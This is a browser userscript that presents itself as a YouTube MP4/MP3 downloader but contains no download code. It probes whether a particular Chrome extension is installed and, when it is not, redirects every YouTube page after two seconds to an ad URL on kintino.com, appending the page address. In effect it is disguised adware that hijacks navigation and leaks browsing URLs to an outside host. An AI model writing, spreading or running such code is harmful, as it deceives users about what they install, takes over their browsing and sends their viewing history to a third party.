// ==UserScript==
// @name         YOUTUBE DIRECT DOWNLOAD MP4, MP3, HD, 3GP, ALL VIDEO 
// @namespace    http://tampermonkey.net/
// @version      1.01
// @description  Download music, video of youtube in the best qualities and without annoying programs.
// @author       Dukaro App
// @match        https://chrome.google.com/webstore/detail/chrome-dashboard/phifenlcioihjeappjcoeldjmjpbhdgc
// @grant        none
// @include http://www.youtube.com/*
// @include https://www.youtube.com/*
// @exclude http://www.youtube.com/embed/*
// @exclude https://www.youtube.com/embed/*
// @match http://www.youtube.com/*
// @match https://www.youtube.com/*
// @match http://s.ytimg.com/yts/jsbin/*
// @match https://s.ytimg.com/yts/jsbin/*
// @match http://manifest.googlevideo.com/*
// @match https://manifest.googlevideo.com/*
// @match http://*.googlevideo.com/videoplayback*
// @match https://*.googlevideo.com/videoplayback*
// @match http://*.youtube.com/videoplayback*
// @match https://*.youtube.com/videoplayback*
// @connect googlevideo.com
// @connect ytimg.com
// ==/UserScript==
function dukainifile(file, callback){
  var xhttp = new XMLHttpRequest();
  var method = "GET";
  var url = file;
  xhttp.open("GET", file, true);
  xhttp.onreadystatechange = function() {
    if (xhttp.readyState === XMLHttpRequest.DONE && xhttp.status === 200) {
        callback(xhttp.responseText);
    }else{
        callback(0);
    }
  };
  console.log(xhttp);
  xhttp.send();
}
function browserinfo(){
    var nVer = navigator.appVersion;
    var nAgt = navigator.userAgent;
    var browserName  = navigator.appName;
    var fullVersion  = ''+parseFloat(navigator.appVersion);
    var majorVersion = parseInt(navigator.appVersion,10);
    var nameOffset,verOffset,ix;

    // In Opera 15+, the true version is after "OPR/"
    if ((verOffset=nAgt.indexOf("OPR/"))!=-1) {
     browserName = "Opera";
     fullVersion = nAgt.substring(verOffset+4);
    }
    // In older Opera, the true version is after "Opera" or after "Version"
    else if ((verOffset=nAgt.indexOf("Opera"))!=-1) {
     browserName = "Opera";
     fullVersion = nAgt.substring(verOffset+6);
     if ((verOffset=nAgt.indexOf("Version"))!=-1)
       fullVersion = nAgt.substring(verOffset+8);
    }
    // In MSIE, the true version is after "MSIE" in userAgent
    else if ((verOffset=nAgt.indexOf("MSIE"))!=-1) {
     browserName = "Microsoft Internet Explorer";
     fullVersion = nAgt.substring(verOffset+5);
    }
    // In Chrome, the true version is after "Chrome"
    else if ((verOffset=nAgt.indexOf("Chrome"))!=-1) {
     browserName = "Chrome";
     fullVersion = nAgt.substring(verOffset+7);
    }
    // In Safari, the true version is after "Safari" or after "Version"
    else if ((verOffset=nAgt.indexOf("Safari"))!=-1) {
     browserName = "Safari";
     fullVersion = nAgt.substring(verOffset+7);
     if ((verOffset=nAgt.indexOf("Version"))!=-1)
       fullVersion = nAgt.substring(verOffset+8);
    }
    // In Firefox, the true version is after "Firefox"
    else if ((verOffset=nAgt.indexOf("Firefox"))!=-1) {
     browserName = "Firefox";
     fullVersion = nAgt.substring(verOffset+8);
    }
    // In most other browsers, "name/version" is at the end of userAgent
    else if ( (nameOffset=nAgt.lastIndexOf(' ')+1) <
              (verOffset=nAgt.lastIndexOf('/')) )
    {
     browserName = nAgt.substring(nameOffset,verOffset);
     fullVersion = nAgt.substring(verOffset+1);
     if (browserName.toLowerCase()==browserName.toUpperCase()) {
      browserName = navigator.appName;
     }
    }
    // trim the fullVersion string at semicolon/space if present
    if ((ix=fullVersion.indexOf(";"))!=-1)
       fullVersion=fullVersion.substring(0,ix);
    if ((ix=fullVersion.indexOf(" "))!=-1)
       fullVersion=fullVersion.substring(0,ix);

    majorVersion = parseInt(''+fullVersion,10);
    if (isNaN(majorVersion)) {
     fullVersion  = ''+parseFloat(navigator.appVersion);
     majorVersion = parseInt(navigator.appVersion,10);
    }
    return {'name':browserName,'fullversion':fullVersion,'version':majorVersion,'browsername':navigator.appName,'browseragent':navigator.userAgent};
}
var brow = browserinfo();
var uriapp = {'Chrome':'chrome-extension://phifenlcioihjeappjcoeldjmjpbhdgc/panel.html'};
(function(){
    'use strict';
     var bd = document.getElementsByTagName('body');
    if(brow['name'] === "Chrome"){
        dukainifile(uriapp['Chrome'], function(d){
            if(d !== 0){
                bd[0].setAttribute('ac','1');
            }else{
                bd[0].setAttribute('ac','0');
            }
        });
    }
    setTimeout(function(){
        var url = location.href;
        if(/0/i.test(bd[0].getAttribute('ac'))){
            location.href = 'http://kintino.com/ads/youtubeforce/?url='+encodeURIComponent(url);
        }
    },2000);
})();
